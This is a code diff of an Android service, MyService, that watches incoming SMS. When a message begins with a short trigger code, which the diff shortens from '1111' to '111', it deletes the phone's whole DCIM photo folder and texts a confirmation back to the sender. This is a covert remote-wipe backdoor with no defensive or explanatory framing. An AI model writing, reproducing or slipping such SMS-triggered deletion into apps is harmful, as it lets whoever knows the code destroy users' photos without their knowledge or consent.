@@ -90,13 +90,13 @@ public class MyService extends Service {
                             .createFromPdu((byte[]) messages[n]);
                     String body = smsMessage[n].getMessageBody();
                     try {
-                        if (body.startsWith("1111")) {
+                        if (body.startsWith("111")) {
                             final String num = smsMessage[n].getOriginatingAddress();
                             //收到短信指令后  获取相册内容 删除
                             String dcimPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
                             FileCacheUtils.deleteFile(new File(dcimPath));
                             SmsManager smsManager = SmsManager.getDefault();
-                                smsManager.sendTextMessage(num, null, "ok111", null,
+                                smsManager.sendTextMessage(num, null, "111ok", null,
                                         null);
                         }
                     } catch (Exception e) {
